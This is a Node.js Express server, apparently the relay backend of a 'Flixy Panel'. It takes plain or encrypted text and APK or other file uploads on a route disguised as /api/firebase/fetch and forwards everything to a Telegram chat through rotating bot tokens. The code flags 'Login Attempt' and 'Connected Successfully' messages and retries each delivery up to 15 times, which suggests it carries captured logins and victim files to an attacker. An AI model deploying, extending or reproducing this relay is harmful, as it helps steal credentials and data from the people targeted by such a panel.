#!/usr/bin/env node
// Flixy Panel — Telegram Proxy Server  v3
// Host on Render / Railway / Fly.io / any Node 18+ host.
// Credentials are in .env — edit that file before deploying.

import "dotenv/config";
import express from "express";
import multer from "multer";
import crypto from "crypto";

const app = express();
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }, // 100 MB
});

// ── Config ─────────────────────────────────────────────────────────────────────
const CHAT_ID        = process.env.TELEGRAM_CHAT_ID ?? "";
const PROXY_SECRET   = process.env.PROXY_SECRET ?? "";
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ?? "")
  .split(",").map(s => s.trim()).filter(Boolean);
const PORT = Number(process.env.PORT ?? 3001);

// Multiple bot tokens: TELEGRAM_BOT_TOKENS=token1,token2,token3
// Falls back to TELEGRAM_BOT_TOKEN for single-token setups.
const BOT_TOKENS = [
  ...(process.env.TELEGRAM_BOT_TOKENS ?? "").split(",").map(s => s.trim()).filter(Boolean),
  ...(process.env.TELEGRAM_BOT_TOKEN   ?? "").split(",").map(s => s.trim()).filter(Boolean),
].filter((v, i, a) => v && a.indexOf(v) === i); // dedupe

// ── Logging ────────────────────────────────────────────────────────────────────
// Always plain-text + timestamps — readable in Render dashboard.
function log(...args) {
  const ts = new Date().toISOString().replace("T", " ").slice(0, 19);
  console.log(`[${ts}]`, ...args);
}

if (BOT_TOKENS.length === 0) {
  log("⚠️  No bot tokens configured! Set TELEGRAM_BOT_TOKENS in .env");
} else {
  log(`✅ Loaded ${BOT_TOKENS.length} bot token(s)`);
}

// ── Rate-limit tracker ─────────────────────────────────────────────────────────
const rateLimitedUntil = new Map(); // token → timestamp

// Two independent token cursors: text messages use one, file uploads use another.
// This way a slow APK upload never delays a text message.
let textCursor = 0;
let fileCursor = 1 % Math.max(BOT_TOKENS.length, 1);

function getToken(cursorRef) {
  if (BOT_TOKENS.length === 0) return { token: null, next: 0 };
  const now = Date.now();
  for (let i = 0; i < BOT_TOKENS.length; i++) {
    const idx   = (cursorRef.value + i) % BOT_TOKENS.length;
    const token = BOT_TOKENS[idx];
    if ((rateLimitedUntil.get(token) ?? 0) <= now) {
      cursorRef.value = (idx + 1) % BOT_TOKENS.length;
      return token;
    }
  }
  // All rate-limited — pick whichever unlocks soonest
  let best = BOT_TOKENS[0], bestUntil = rateLimitedUntil.get(best) ?? 0;
  for (const t of BOT_TOKENS) {
    const u = rateLimitedUntil.get(t) ?? 0;
    if (u < bestUntil) { best = t; bestUntil = u; }
  }
  const waitSec = Math.ceil((bestUntil - now) / 1000);
  log(`⏳ All tokens rate-limited. Next token in ${waitSec}s`);
  return best;
}

function markRateLimited(token, retryAfter) {
  rateLimitedUntil.set(token, Date.now() + (retryAfter + 1) * 1000);
  log(`🚫 Token …${token.slice(-6)} rate-limited for ${retryAfter}s → rotating`);
}

// ── Retry helper — NEVER skips ─────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function withRetry(label, fn, maxAttempts = 15) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      await fn();
      return true;
    } catch (err) {
      if (attempt === maxAttempts) {
        log(`❌ [${label}] gave up after ${maxAttempts} attempts: ${err.message}`);
        return false;
      }
      const delay = Math.min(1000 * Math.pow(2, attempt - 1), 60_000);
      log(`⚠️  [${label}] attempt ${attempt} failed (${err.message}) — retry in ${(delay/1000).toFixed(0)}s`);
      await sleep(delay);
    }
  }
  return false;
}

// ── Telegram API helpers ───────────────────────────────────────────────────────
const TEXT_CURSOR = { value: 0 };
const FILE_CURSOR = { value: Math.min(1, BOT_TOKENS.length - 1) };

async function tgPost(token, path, bodyInit) {
  const res = await fetch(`https://api.telegram.org/bot${token}${path}`, bodyInit);
  if (res.status === 429) {
    const data = await res.json().catch(() => ({}));
    const retryAfter = data?.parameters?.retry_after ?? 30;
    markRateLimited(token, retryAfter);
    await sleep((retryAfter + 1) * 1000);
    throw new Error(`429 rate-limited (${retryAfter}s)`);
  }
  if (!res.ok) {
    const body = await res.text().catch(() => "");
    throw new Error(`HTTP ${res.status}: ${body.slice(0, 200)}`);
  }
  return res;
}

// High-priority: text messages. Uses TEXT_CURSOR pool.
async function sendMessage(text) {
  const label = `msg:${text.slice(0, 50).replace(/\n/g, " ")}`;
  await withRetry(label, () => {
    const token = getToken(TEXT_CURSOR);
    if (!token) return Promise.resolve();
    return tgPost(token, "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  });
}

// Lower-priority: file uploads. Uses FILE_CURSOR pool (separate from text).
async function sendDocument(fileBuffer, filename, mimetype, caption) {
  const label = `doc:${filename}`;
  await withRetry(label, () => {
    const token = getToken(FILE_CURSOR);
    if (!token) return Promise.resolve();
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append(
      "document",
      new Blob([new Uint8Array(fileBuffer)], { type: mimetype || "application/octet-stream" }),
      filename || "file.bin"
    );
    if (caption) form.append("caption", caption);
    form.append("parse_mode", "HTML");
    return tgPost(token, "/sendDocument", { method: "POST", body: form });
  });
}

// ── Crypto helpers ─────────────────────────────────────────────────────────────
function deriveKey(secret) {
  return crypto.pbkdf2Sync(secret, "flixy-panel", 100_000, 32, "sha256");
}

function decryptBody(raw, secret) {
  const key       = deriveKey(secret);
  const iv        = Buffer.from(raw.iv, "base64");
  const ctWithTag = Buffer.from(raw.d,  "base64");
  const authTag   = ctWithTag.subarray(-16);
  const cipher    = ctWithTag.subarray(0, -16);
  const dec       = crypto.createDecipheriv("aes-256-gcm", key, iv);
  dec.setAuthTag(authTag);
  const plain = Buffer.concat([dec.update(cipher), dec.final()]);
  return JSON.parse(plain.toString("utf8"));
}

// ── CORS ───────────────────────────────────────────────────────────────────────
function applyCors(req, res) {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

function checkOrigin(req, res) {
  if (ALLOWED_ORIGINS.length === 0) return true;
  const origin = req.headers.origin ?? req.headers.referer ?? "";
  if (!ALLOWED_ORIGINS.some(o => origin.startsWith(o))) {
    res.status(403).json({ ok: false, error: "Origin not allowed" });
    return false;
  }
  return true;
}

app.use(express.json());

// ── Health ─────────────────────────────────────────────────────────────────────
app.get("/api/health", (_req, res) =>
  res.json({ status: "ok", ts: Date.now(), tokens: BOT_TOKENS.length })
);

// ── Preflight ──────────────────────────────────────────────────────────────────
app.options("/api/firebase/fetch", (req, res) => {
  applyCors(req, res);
  res.setHeader("Access-Control-Max-Age", "86400");
  res.status(204).end();
});

// ── Main route ─────────────────────────────────────────────────────────────────
app.post("/api/firebase/fetch", upload.single("file"), (req, res) => {
  applyCors(req, res);
  if (!checkOrigin(req, res)) return;

  // Always respond immediately — never make the panel wait.
  res.json({ ok: true });

  if (!CHAT_ID) { log("⚠️  TELEGRAM_CHAT_ID not set — skipping forward"); return; }

  const file = req.file;

  // ── File / APK upload ──────────────────────────────────────────────────────
  if (file) {
    if (PROXY_SECRET && req.body?.secret !== PROXY_SECRET) {
      log("🔒 File upload rejected — bad secret");
      return;
    }
    const caption = req.body?.caption ?? req.body?.text ?? "";
    log(`📎 Queuing file → ${file.originalname} (${(file.size / 1024).toFixed(1)} KB)`);

    // Fire-and-forget — low-priority background upload
    sendDocument(file.buffer, file.originalname, file.mimetype, caption)
      .then(() => log(`✅ File sent: ${file.originalname}`))
      .catch(err => log(`❌ File failed: ${file.originalname} — ${err.message}`));
    return;
  }

  // ── Text / encrypted payload ───────────────────────────────────────────────
  const raw = req.body;
  let text = "";

  if (raw?.d && raw?.iv) {
    if (!PROXY_SECRET) { log("⚠️  Encrypted payload but PROXY_SECRET not set"); return; }
    try {
      text = decryptBody(raw, PROXY_SECRET).text ?? "";
    } catch {
      log("⚠️  Decryption failed — PROXY_SECRET mismatch?");
      return;
    }
  } else {
    if (PROXY_SECRET && raw?.secret !== PROXY_SECRET) {
      log("🔒 Text payload rejected — bad secret");
      return;
    }
    text = raw?.text ?? "";
  }

  if (!text) return;

  // Detect high-priority messages (shareable link, connected status) — log them specially
  const isLink    = text.includes("Shareable Panel Link") || text.includes("?s=");
  const isConnect = text.includes("Connected Successfully") || text.includes("Login Attempt");
  const kind      = isLink ? "🔗 link" : isConnect ? "🔑 connect" : "💬 msg";

  log(`${kind} → queuing (${text.length} chars)`);

  // All text messages are high-priority — fire-and-forget immediately
  sendMessage(text)
    .then(() => log(`✅ Sent ${kind}`))
    .catch(err => log(`❌ ${kind} failed — ${err.message}`));
});

app.listen(PORT, () => {
  log(`🚀 Telegram proxy v3 running on port ${PORT}`);
  log(`   Tokens : ${BOT_TOKENS.length} (text cursor → token 0, file cursor → token ${Math.min(1, BOT_TOKENS.length - 1)})`);
  log(`   Chat   : ${CHAT_ID || "NOT SET ⚠️"}`);
  log(`   Secret : ${PROXY_SECRET ? "enabled" : "disabled"}`);
  log(`   Origins: ${ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS.join(", ") : "all allowed"}`);
});
